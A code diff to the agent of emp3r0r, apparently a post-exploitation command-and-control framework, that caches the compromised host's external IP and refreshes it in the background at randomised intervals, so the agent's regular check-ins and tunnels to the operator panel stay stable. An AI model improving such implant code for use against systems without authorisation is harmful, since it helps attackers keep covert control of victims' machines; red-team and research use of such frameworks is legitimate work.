@@ -13,6 +13,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // externalIPSources are public "echo your IP" endpoints, used ONLY when no
@@ -38,7 +39,46 @@ var externalIPSources = []string{
 // must self-report it. DNS for these lookups goes through whatever resolver
 // the agent process has installed (DoH when configured).
 func GetExternalIP() string {
-	return GetExternalIPTimeout(4 * time.Second)
+	// cached value only — this runs inside GatherSystemDetails on EVERY
+	// checkin, so it must never block: a live probe can take the full
+	// budget (observed a 16min gather during a relay outage), stalling
+	// checkin and cascading into tunnel teardowns. Freshness comes from
+	// StartExternalIPRefresher instead.
+	extipMu.RLock()
+	defer extipMu.RUnlock()
+	return extipCached
+}
+
+var (
+	extipMu     sync.RWMutex
+	extipCached string
+)
+
+// StartExternalIPRefresher periodically re-learns the egress IP in the
+// background so checkins never wait on it. The first successful probe fills
+// the cache; later probes only overwrite on change (the panel shows a new
+// address when the agent moves networks).
+func StartExternalIPRefresher(ctx context.Context) {
+	probe := func() {
+		ip := GetExternalIPTimeout(8 * time.Second)
+		if ip == "" {
+			return
+		}
+		extipMu.Lock()
+		extipCached = ip
+		extipMu.Unlock()
+	}
+	probe() // one immediate attempt at startup
+	go func() {
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-time.After(time.Duration(util.RandInt(15, 30)) * time.Minute):
+				probe()
+			}
+		}
+	}()
 }
 
 // GetExternalIPTimeout is GetExternalIP with an explicit overall budget.
